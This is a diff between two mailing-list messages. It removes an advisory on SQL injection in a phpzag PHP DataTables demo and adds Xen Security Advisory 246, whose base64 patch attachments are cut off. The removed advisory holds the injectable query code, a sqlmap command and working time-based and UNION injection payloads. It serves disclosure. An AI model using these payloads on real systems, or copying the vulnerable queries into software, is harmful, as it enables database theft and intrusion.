@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["7691" "Thursday" "9" "July" "2020" "09:27:13" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<0612DFF1-F44E-4A33-9AC7-F5681B597AAB@me.com>" "70" "[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql" nil nil nil "7" "2020070913:27:13" "[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql" (number mark "U       larry0@me.co Jul  9   70/7691  " thread-indent "\"[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["16649" "Thursday" "30" "November" "2017" "11:59:51" "+0000" "Xen.org security team" "security@xen.org" "<E1eKNVP-0008EZ-Au@xenbits.xenproject.org>" "345" "[oss-security] Xen Security Advisory 246 (CVE-2017-17044) - x86: infinite loop due to missing PoD error checking" nil nil nil "11" "2017113011:59:51" "[oss-security] Xen Security Advisory 246 (CVE-2017-17044) - x86: infinite loop due to missing PoD error checking" (number mark "U       security@xen Nov 30  345/16649 " thread-indent "\"[oss-security] Xen Security Advisory 246 (CVE-2017-17044) - x86: infinite loop due to missing PoD error checking\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11459 invoked by uid 550); 9 Jul 2020 13:27:28 -0000
+Received: (qmail 3276 invoked by uid 550); 30 Nov 2017 12:00:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,103 +12,362 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 11414 invoked from network); 9 Jul 2020 13:27:28 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
-	t=1594301235; bh=yU3L7G/SjskYgQE0bd1n3yEQD27yEMwMemVYKZLMpWo=;
-	h=Date:Subject:From:To:Message-ID:Content-type;
-	b=AEz5TP66OTzLp0DRCqKYpA2L4t3r+iQYSd3zGgA//EehQ/u6W++XxDsrQyTav/WBe
-	 zXE0mw83dcM+uSzDaHoHBF69XsH05W5X8zEoi8oEv9EM61QCr8sMFNgApKd4i5i9EX
-	 7CUOgQzTdmQ4UFb59p5yc1y81WNbyeUE6zizil3cvIChEWSfU83v5ulkDN8nRRlK35
-	 0dQ5RhXzsyV+x5JY4YrdplEKz7c41s1DP/lg5/ae91v8aKSJHSHrMaqnapF2ooekpH
-	 vxHB1p8Sbk8tY9LbpbkD2dfRXk2DiU5HGRIrZYfmYi6+/cJoM9EexqL4aIx3BdB7sn
-	 dXCC9yNOj3Uwg==
-User-Agent: Microsoft-MacOutlook/16.38.20061401
-Date: Thu, 09 Jul 2020 09:27:13 -0400
-From: "Larry W. Cashdollar" <larry0@me.com>
-To: Open Security <oss-security@lists.openwall.com>
-Message-ID: <0612DFF1-F44E-4A33-9AC7-F5681B597AAB@me.com>
-Thread-Topic: SQL Injection in search field of phpzag live add edit delete
- data tables records with ajax php mysql
-Mime-version: 1.0
-Content-type: text/plain;
-	charset="UTF-8"
-Content-transfer-encoding: 7bit
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.235,18.0.687
- definitions=2020-07-09_07:2020-07-09,2020-07-09 signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
- phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
- mlxlogscore=999 adultscore=0 classifier=spam adjust=0 reason=mlx
- scancount=1 engine=8.0.1-2004280000 definitions=main-2007090101
-Subject: [oss-security] SQL Injection in search field of phpzag live add edit delete data
- tables records with ajax php mysql
+Received: (qmail 3191 invoked from network); 30 Nov 2017 12:00:10 -0000
+Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
+Content-Transfer-Encoding: binary
+MIME-Version: 1.0
+X-Mailer: MIME-tools 5.505 (Entity 5.505)
+To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
+ xen-users@lists.xen.org, oss-security@lists.openwall.com
+From: Xen.org security team <security@xen.org>
+CC: Xen.org security team <security-team-members@xen.org>
+Message-Id: <E1eKNVP-0008EZ-Au@xenbits.xenproject.org>
+Date: Thu, 30 Nov 2017 11:59:51 +0000
+Subject: [oss-security] Xen Security Advisory 246 (CVE-2017-17044) - x86: infinite loop
+ due to missing PoD error checking
 
-SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql
-Author: Larry W. Cashdollar, @_larry0
-Date: 2020-05-19
-CVE-ID:[CVE-2020-8519][CVE- 2020-8520][CVE- 2020-8521]
-Download Site: https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/
-Vendor: PHPZAG
-Vendor Notified: 2020-05-19
-Advisory: http://www.vapidlabs.com/advisory.php?v=213
-Description: DataTables is a jQuery JavaScript library to convert simple HTML tables to dynamic feature-rich tables. The jQuery DataTables are very user friendly to list records with live add, edit, delete records without page refresh. Due to this, DataTables used widely in web applications to list records.
+--=separator
+Content-Type: text/plain; charset="utf-8"
+Content-Disposition: inline
+Content-Transfer-Encoding: 7bit
 
-Vulnerability:
-There is SQL injection in the search function in Records.php:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-CVE-2020-8519 SQL injection in search parameter:
- 
- 20     if(!empty($_POST["search"]["value"])){
- 21                         $sqlQuery .= 'where(id LIKE "%'.$_POST["search"]["value"].'%" ';
- 22                         $sqlQuery .= ' OR name LIKE "%'.$_POST["search"]["value"].'%" ';
- 23                         $sqlQuery .= ' OR designation LIKE "%'.$_POST["search"]["value"].'%" ';
- 24                         $sqlQuery .= ' OR address LIKE "%'.$_POST["search"]["value"].'%" ';
- 25                         $sqlQuery .= ' OR skills LIKE "%'.$_POST["search"]["value"].'%") ';
- 26                 }
- 27
+            Xen Security Advisory CVE-2017-17044 / XSA-246
+                              version 3
 
-CVE-2020-8520  SQL Injection in line 29 with 'order' and 'column' parameter:
- 
- 28                 if(!empty($_POST["order"])){
- 29                         $sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
- 30                 } else {
- 31                         $sqlQuery .= 'ORDER BY id DESC ';
- 32                 }
+         x86: infinite loop due to missing PoD error checking
 
-CVE-2020-8521 SQL Injection line 35 with 'start' and 'length' parameters: 
+UPDATES IN VERSION 3
+====================
 
- 34                 if($_POST["length"] != -1){
- 35                         $sqlQuery .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
- 36                 }
-Exploit Code:
-$ sqlmap -u "http://192.168.0.149/live-add-edit-delete-datatables-php-mysql-demo/ajax_action.php" --data "draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[
- 5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]="+and+"1&search[regex]=false&action=listRecords" -p "search[value]" --method POST --dbms=mysql --level 2 --risk 2
-.
-.
-[10:39:53] [INFO] POST parameter 'search[value]' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] y
-[10:40:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[10:40:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[10:40:00] [INFO] target URL appears to be UNION injectable with 6 columns
-[10:40:00] [INFO] POST parameter 'search[value]' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
-POST parameter 'search[value]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
-sqlmap identified the following injection point(s) with a total of 203 HTTP(s) requests:
----
-Parameter: search[value] (POST)
-    Type: AND/OR time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&colu
- mns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]= and 1") AND (SELECT * FROM (SELECT(SLEEP(5)))KGDc) AND ("Aejs"="Aejs&search[regex]=false&action=listRecords
- 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 6 columns
-    Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&colu
- mns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]= and 1") UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717671,0x5a6b657a455263557478797469434e4f506b596f4e5a585668496b6e7464796e6a6f6a596e656b4e,0x717a767171),NULL-- SkNj&search[regex]=false&action=listRecords
----
-[10:40:02] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu
-web application technology: Apache 2.4.29
-back-end DBMS: MySQL >= 5.0.12
+CVE assigned.
 
+ISSUE DESCRIPTION
+=================
 
+Failure to recognize errors being returned from low level functions in
+Populate on Demand (PoD) code may result in higher level code entering
+an infinite loop.
 
+IMPACT
+======
 
+A malicious HVM guest can cause one pcpu to permanently hang.  This
+normally cascades into the whole system freezing, resulting in a a
+host Denial of Service (DoS).
+
+VULNERABLE SYSTEMS
+==================
+
+Xen versions from 3.4.x onwards are affected.
+
+Only x86 systems are vulnerable.  ARM is not vulnerable.
+
+x86 PV VMs cannot leverage the vulnerability.
+
+Only systems with 2MiB or 1GiB HAP pages enabled are vulnerable.
+
+The vulnerability is largely restricted to HVM guests which have been
+constructed in Populate-on-Demand mode (i.e. with memory < maxmem):
+
+x86 HVM domains without PoD (i.e. started with memory == maxmem, or
+without mentioning "maxmem" in the guest config file) also cannot
+leverage the vulnerability, in recent enough Xen versions:
+  4.8.x and later: all versions safe if PoD not configured
+  4.7.x: 4.7.1 and later safe if PoD not configured
+  4.6.x: 4.6.4 and later safe if PoD not configured
+  4.5.x: 4.5.4 and later safe if PoD not configured
+  4.4.x and earlier: all versions vulnerable even if PoD not configured
+
+The commit required to prevent this vulnerability when PoD
+not configured is 2a99aa99fc84a45f505f84802af56b006d14c52e
+  xen/physmap: Do not permit a guest to populate PoD pages for itself
+and the corresponding backports.
+
+MITIGATION
+==========
+
+Running only PV guests will avoid this issue.
+
+Running HVM guests only in non-PoD mode (maxmem == memory) will also
+avoid this issue.  NOTE: In older releases of Xen, an HVM guest can
+create PoD entries itself; so this mitigation will not be effective.
+
+Specifying "hap_1gb=0 hap_2mb=0" on the hypervisor command line will
+avoid the vulnerability.
+
+Alternatively, running all x86 HVM guests in shadow mode will also
+avoid this vulnerability.  (For example, by specifying "hap=0" in the
+xl domain configuration file.)
+
+CREDITS
+=======
+
+This issue was discovered by Julien Grall of Linaro.
+
+RESOLUTION
+==========
+
+Applying the appropriate attached patch resolves this issue.
+
+xsa246.patch           xen-unstable
+xsa246-4.9.patch       Xen 4.9.x, Xen 4.8.x
+xsa246-4.7.patch       Xen 4.7.x, Xen 4.6.x, Xen 4.5.x
+
+$ sha256sum xsa246*
+df08a3be419f2384b495dc52c3e6ebef1eb67d8b562afe85fb6fe6a723334472  xsa246.patch
+b41550688e88a2a7a22349a07168f3a3ddf6fad8b3389fa27de44ae6731b6a8b  xsa246-4.7.patch
+ea591542774c22db65dcb340120cebf58e759670b5a9fbde42ee93ed594650c8  xsa246-4.9.patch
+$
+
+DEPLOYMENT DURING EMBARGO
+=========================
+
+Deployment of the patches and/or mitigations described above (or
+others which are substantially similar) is permitted during the
+embargo, even on public-facing systems with untrusted guest users and
+administrators, with ONE exception:
+
+Removing the ability to boot in populate-on-demand mode is NOT
+permitted during the embargo on public cloud systems.  This is because
+doing so might alert attackers to the nature of the vulnerability.
+Deployment of this mitigation is permitted only AFTER the embargo
+ends.
+
+Distribution of updated software is prohibited (except to other
+members of the predisclosure list).
+
+Predisclosure list members who wish to deploy significantly different
+patches and/or mitigations, please contact the Xen Project Security
+Team.
+
+(Note: this during-embargo deployment notice is retained in
+post-embargo publicly released Xen Project advisories, even though it
+is then no longer applicable.  This is to enable the community to have
+oversight of the Xen Project Security Team's decisionmaking.)
+
+For more information about permissible uses of embargoed information,
+consult the Xen Project community's agreed Security Policy:
+  http://www.xenproject.org/security-policy.html
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQEcBAEBCAAGBQJaH/KNAAoJEIP+FMlX6CvZi5sIAJojGRp1oewRc3JkEolFITBb
+EcQDq9n7ppd21q+hRmYKT+IwRILahxGFbfQJHzCbu9KHFNswt9dgFNlkBk2Jk+rD
+q3LzoSeIBrNVazfIX6VpGtgrPxlsAJzsmvAp5LgdZ+H3tYqsHYdyeoaPFAtbuB40
+6WgBWv2Z003uRCvK5F8ka3cRrWsuuiae9gnUKfLjt4eAu7rES8wFG+VE4n/o6RLg
+YJuyCL97rYXgBRAABO/1bR7mKWhyux3WbtZjjDSnUcn+O3UOpVH49bL5JHb1XKuS
+ycdwYtfjTwB7nB1o7TnYGEQKieqlWDWOylWTWJxA3cOsIHHB2syTV3L9vVukti0=
+=CmSs
+-----END PGP SIGNATURE-----
+
+--=separator
+Content-Type: application/octet-stream; name="xsa246.patch"
+Content-Disposition: attachment; filename="xsa246.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbTogSnVsaWVuIEdyYWxsIDxqdWxpZW4uZ3JhbGxAbGluYXJvLm9yZz4K
+U3ViamVjdDogeDg2L3BvZDogcHJldmVudCBpbmZpbml0ZSBsb29wIHdoZW4g
+c2hhdHRlcmluZyBsYXJnZSBwYWdlcwoKV2hlbiBwb3B1bGF0aW5nIHBhZ2Vz
+LCB0aGUgUG9EIG1heSBuZWVkIHRvIHNwbGl0IGxhcmdlIG9uZXMgdXNpbmcK
+cDJtX3NldF9lbnRyeSBhbmQgcmVxdWVzdCB0aGUgY2FsbGVyIHRvIHJldHJ5
+IChzZWUgZXB0X2dldF9lbnRyeSBmb3IKaW5zdGFuY2UpLgoKcDJtX3NldF9l
+bnRyeSBtYXkgZmFpbCB0byBzaGF0dGVyIGlmIGl0IGlzIG5vdCBwb3NzaWJs
+ZSB0byBhbGxvY2F0ZQptZW1vcnkgZm9yIHRoZSBuZXcgcGFnZSB0YWJsZS4g
+SG93ZXZlciwgdGhlIGVycm9yIGlzIG5vdCBwcm9wYWdhdGVkCnJlc3VsdGlu
+ZyB0byB0aGUgY2FsbGVycyB0byByZXRyeSBpbmZpbml0ZWx5IHRoZSBQb0Qu
+CgpQcmV2ZW50IHRoZSBpbmZpbml0ZSBsb29wIGJ5IHJldHVybiBmYWxzZSB3
+aGVuIGl0IGlzIG5vdCBwb3NzaWJsZSB0bwpzaGF0dGVyIHRoZSBsYXJnZSBt
+YXBwaW5nLgoKVGhpcyBpcyBYU0EtMjQ2LgoKU2lnbmVkLW9mZi1ieTogSnVs
+aWVuIEdyYWxsIDxqdWxpZW4uZ3JhbGxAbGluYXJvLm9yZz4KU2lnbmVkLW9m
+Zi1ieTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpSZXZpZXdl
+ZC1ieTogR2VvcmdlIER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29t
+PgoKLS0tIGEveGVuL2FyY2gveDg2L21tL3AybS1wb2QuYworKysgYi94ZW4v
+YXJjaC94ODYvbW0vcDJtLXBvZC5jCkBAIC0xMTEzLDkgKzExMTMsOCBAQCBw
+Mm1fcG9kX2RlbWFuZF9wb3B1bGF0ZShzdHJ1Y3QgcDJtX2RvbWFpCiAgICAg
+ICAgICAqIE5PVEU6IEluIGEgZmluZS1ncmFpbmVkIHAybSBsb2NraW5nIHNj
+ZW5hcmlvIHRoaXMgb3BlcmF0aW9uCiAgICAgICAgICAqIG1heSBuZWVkIHRv
+IHByb21vdGUgaXRzIGxvY2tpbmcgZnJvbSBnZm4tPjFnIHN1cGVycGFnZQog
+ICAgICAgICAgKi8KLSAgICAgICAgcDJtX3NldF9lbnRyeShwMm0sIGdmbl9h
+bGlnbmVkLCBJTlZBTElEX01GTiwgUEFHRV9PUkRFUl8yTSwKLSAgICAgICAg
+ICAgICAgICAgICAgICBwMm1fcG9wdWxhdGVfb25fZGVtYW5kLCBwMm0tPmRl
+ZmF1bHRfYWNjZXNzKTsKLSAgICAgICAgcmV0dXJuIHRydWU7CisgICAgICAg
+IHJldHVybiAhcDJtX3NldF9lbnRyeShwMm0sIGdmbl9hbGlnbmVkLCBJTlZB
+TElEX01GTiwgUEFHRV9PUkRFUl8yTSwKKyAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgIHAybV9wb3B1bGF0ZV9vbl9kZW1hbmQsIHAybS0+ZGVmYXVs
+dF9hY2Nlc3MpOwogICAgIH0KIAogICAgIC8qIE9ubHkgcmVjbGFpbSBpZiB3
+ZSdyZSBpbiBhY3R1YWwgbmVlZCBvZiBtb3JlIGNhY2hlLiAqLwpAQCAtMTE0
+Nyw4ICsxMTQ2LDEyIEBAIHAybV9wb2RfZGVtYW5kX3BvcHVsYXRlKHN0cnVj
+dCBwMm1fZG9tYWkKIAogICAgIEJVR19PTigobWZuX3gobWZuKSAmICgoMVVM
+IDw8IG9yZGVyKSAtIDEpKSAhPSAwKTsKIAotICAgIHAybV9zZXRfZW50cnko
+cDJtLCBnZm5fYWxpZ25lZCwgbWZuLCBvcmRlciwgcDJtX3JhbV9ydywKLSAg
+ICAgICAgICAgICAgICAgIHAybS0+ZGVmYXVsdF9hY2Nlc3MpOworICAgIGlm
+ICggcDJtX3NldF9lbnRyeShwMm0sIGdmbl9hbGlnbmVkLCBtZm4sIG9yZGVy
+LCBwMm1fcmFtX3J3LAorICAgICAgICAgICAgICAgICAgICAgICBwMm0tPmRl
+ZmF1bHRfYWNjZXNzKSApCisgICAgeworICAgICAgICBwMm1fcG9kX2NhY2hl
+X2FkZChwMm0sIHAsIG9yZGVyKTsKKyAgICAgICAgZ290byBvdXRfZmFpbDsK
+KyAgICB9CiAKICAgICBmb3IoIGkgPSAwOyBpIDwgKDFVTCA8PCBvcmRlcik7
+IGkrKyApCiAgICAgewpAQCAtMTE5MywxNCArMTE5NiwxNyBAQCByZW1hcF9h
+bmRfcmV0cnk6CiAgICAgQlVHX09OKG9yZGVyICE9IFBBR0VfT1JERVJfMk0p
+OwogICAgIHBvZF91bmxvY2socDJtKTsKIAotICAgIC8qIFJlbWFwIHRoaXMg
+Mi1tZWcgcmVnaW9uIGluIHNpbmdsZXRvbiBjaHVua3MgKi8KICAgICAvKgor
+ICAgICAqIFJlbWFwIHRoaXMgMi1tZWcgcmVnaW9uIGluIHNpbmdsZXRvbiBj
+aHVua3MuIFNlZSB0aGUgY29tbWVudCBvbiB0aGUKKyAgICAgKiAxRyBwYWdl
+IHNwbGl0dGluZyBwYXRoIGFib3ZlIGZvciB3aHkgYSBzaW5nbGUgY2FsbCBz
+dWZmaWNlcy4KKyAgICAgKgogICAgICAqIE5PVEU6IEluIGEgcDJtIGZpbmUt
+Z3JhaW5lZCBsb2NrIHNjZW5hcmlvIHRoaXMgbWlnaHQKICAgICAgKiBuZWVk
+IHByb21vdGluZyB0aGUgZ2ZuIGxvY2sgZnJvbSBnZm4tPjJNIHN1cGVycGFn
+ZS4KICAgICAgKi8KLSAgICBmb3IgKCBpID0gMDsgaSA8ICgxVUwgPDwgb3Jk
+ZXIpOyBpKysgKQotICAgICAgICBwMm1fc2V0X2VudHJ5KHAybSwgZ2ZuX2Fk
+ZChnZm5fYWxpZ25lZCwgaSksIElOVkFMSURfTUZOLCBQQUdFX09SREVSXzRL
+LAotICAgICAgICAgICAgICAgICAgICAgIHAybV9wb3B1bGF0ZV9vbl9kZW1h
+bmQsIHAybS0+ZGVmYXVsdF9hY2Nlc3MpOworICAgIGlmICggcDJtX3NldF9l
+bnRyeShwMm0sIGdmbl9hbGlnbmVkLCBJTlZBTElEX01GTiwgUEFHRV9PUkRF
+Ul80SywKKyAgICAgICAgICAgICAgICAgICAgICAgcDJtX3BvcHVsYXRlX29u
+X2RlbWFuZCwgcDJtLT5kZWZhdWx0X2FjY2VzcykgKQorICAgICAgICByZXR1
+cm4gZmFsc2U7CisKICAgICBpZiAoIHRiX2luaXRfZG9uZSApCiAgICAgewog
+ICAgICAgICBzdHJ1Y3Qgewo=
+
+--=separator
+Content-Type: application/octet-stream; name="xsa246-4.7.patch"
+Content-Disposition: attachment; filename="xsa246-4.7.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbTogSnVsaWVuIEdyYWxsIDxqdWxpZW4uZ3JhbGxAbGluYXJvLm9yZz4K
+U3ViamVjdDogeDg2L3BvZDogcHJldmVudCBpbmZpbml0ZSBsb29wIHdoZW4g
+c2hhdHRlcmluZyBsYXJnZSBwYWdlcwoKV2hlbiBwb3B1bGF0aW5nIHBhZ2Vz
+LCB0aGUgUG9EIG1heSBuZWVkIHRvIHNwbGl0IGxhcmdlIG9uZXMgdXNpbmcK
+cDJtX3NldF9lbnRyeSBhbmQgcmVxdWVzdCB0aGUgY2FsbGVyIHRvIHJldHJ5
+IChzZWUgZXB0X2dldF9lbnRyeSBmb3IKaW5zdGFuY2UpLgoKcDJtX3NldF9l
+bnRyeSBtYXkgZmFpbCB0byBzaGF0dGVyIGlmIGl0IGlzIG5vdCBwb3NzaWJs
+ZSB0byBhbGxvY2F0ZQptZW1vcnkgZm9yIHRoZSBuZXcgcGFnZSB0YWJsZS4g
+SG93ZXZlciwgdGhlIGVycm9yIGlzIG5vdCBwcm9wYWdhdGVkCnJlc3VsdGlu
+ZyB0byB0aGUgY2FsbGVycyB0byByZXRyeSBpbmZpbml0ZWx5IHRoZSBQb0Qu
+CgpQcmV2ZW50IHRoZSBpbmZpbml0ZSBsb29wIGJ5IHJldHVybiBmYWxzZSB3
+aGVuIGl0IGlzIG5vdCBwb3NzaWJsZSB0bwpzaGF0dGVyIHRoZSBsYXJnZSBt
+YXBwaW5nLgoKVGhpcyBpcyBYU0EtMjQ2LgoKU2lnbmVkLW9mZi1ieTogSnVs
+aWVuIEdyYWxsIDxqdWxpZW4uZ3JhbGxAbGluYXJvLm9yZz4KU2lnbmVkLW9m
+Zi1ieTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpSZXZpZXdl
+ZC1ieTogR2VvcmdlIER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29t
+PgoKLS0tIGEveGVuL2FyY2gveDg2L21tL3AybS1wb2QuYworKysgYi94ZW4v
+YXJjaC94ODYvbW0vcDJtLXBvZC5jCkBAIC0xMDczLDkgKzEwNzMsOCBAQCBw
+Mm1fcG9kX2RlbWFuZF9wb3B1bGF0ZShzdHJ1Y3QgcDJtX2RvbWFpCiAgICAg
+ICAgICAqIE5PVEU6IEluIGEgZmluZS1ncmFpbmVkIHAybSBsb2NraW5nIHNj
+ZW5hcmlvIHRoaXMgb3BlcmF0aW9uCiAgICAgICAgICAqIG1heSBuZWVkIHRv
+IHByb21vdGUgaXRzIGxvY2tpbmcgZnJvbSBnZm4tPjFnIHN1cGVycGFnZQog
+ICAgICAgICAgKi8KLSAgICAgICAgcDJtX3NldF9lbnRyeShwMm0sIGdmbl9h
+bGlnbmVkLCBfbWZuKElOVkFMSURfTUZOKSwgUEFHRV9PUkRFUl8yTSwKLSAg
+ICAgICAgICAgICAgICAgICAgICBwMm1fcG9wdWxhdGVfb25fZGVtYW5kLCBw
+Mm0tPmRlZmF1bHRfYWNjZXNzKTsKLSAgICAgICAgcmV0dXJuIDA7CisgICAg
+ICAgIHJldHVybiBwMm1fc2V0X2VudHJ5KHAybSwgZ2ZuX2FsaWduZWQsIF9t
+Zm4oSU5WQUxJRF9NRk4pLCBQQUdFX09SREVSXzJNLAorICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICBwMm1fcG9wdWxhdGVfb25fZGVtYW5kLCBwMm0t
+PmRlZmF1bHRfYWNjZXNzKTsKICAgICB9CiAKICAgICAvKiBPbmx5IHJlY2xh
+aW0gaWYgd2UncmUgaW4gYWN0dWFsIG5lZWQgb2YgbW9yZSBjYWNoZS4gKi8K
+QEAgLTExMDYsOCArMTEwNSwxMiBAQCBwMm1fcG9kX2RlbWFuZF9wb3B1bGF0
+ZShzdHJ1Y3QgcDJtX2RvbWFpCiAKICAgICBnZm5fYWxpZ25lZCA9IChnZm4g
+Pj4gb3JkZXIpIDw8IG9yZGVyOwogCi0gICAgcDJtX3NldF9lbnRyeShwMm0s
+IGdmbl9hbGlnbmVkLCBtZm4sIG9yZGVyLCBwMm1fcmFtX3J3LAotICAgICAg
+ICAgICAgICAgICAgcDJtLT5kZWZhdWx0X2FjY2Vzcyk7CisgICAgaWYgKCBw
+Mm1fc2V0X2VudHJ5KHAybSwgZ2ZuX2FsaWduZWQsIG1mbiwgb3JkZXIsIHAy
+bV9yYW1fcncsCisgICAgICAgICAgICAgICAgICAgICAgIHAybS0+ZGVmYXVs
+dF9hY2Nlc3MpICkKKyAgICB7CisgICAgICAgIHAybV9wb2RfY2FjaGVfYWRk
+KHAybSwgcCwgb3JkZXIpOworICAgICAgICBnb3RvIG91dF9mYWlsOworICAg
+IH0KIAogICAgIGZvciggaSA9IDA7IGkgPCAoMVVMIDw8IG9yZGVyKTsgaSsr
+ICkKICAgICB7CkBAIC0xMTUyLDEzICsxMTU1LDE4IEBAIHJlbWFwX2FuZF9y
+ZXRyeToKICAgICBCVUdfT04ob3JkZXIgIT0gUEFHRV9PUkRFUl8yTSk7CiAg
+ICAgcG9kX3VubG9jayhwMm0pOwogCi0gICAgLyogUmVtYXAgdGhpcyAyLW1l
+ZyByZWdpb24gaW4gc2luZ2xldG9uIGNodW5rcyAqLwotICAgIC8qIE5PVEU6
+IEluIGEgcDJtIGZpbmUtZ3JhaW5lZCBsb2NrIHNjZW5hcmlvIHRoaXMgbWln
+aHQKLSAgICAgKiBuZWVkIHByb21vdGluZyB0aGUgZ2ZuIGxvY2sgZnJvbSBn
+Zm4tPjJNIHN1cGVycGFnZSAqLworICAgIC8qCisgICAgICogUmVtYXAgdGhp
+cyAyLW1lZyByZWdpb24gaW4gc2luZ2xldG9uIGNodW5rcy4gU2VlIHRoZSBj
+b21tZW50IG9uIHRoZQorICAgICAqIDFHIHBhZ2Ugc3BsaXR0aW5nIHBhdGgg
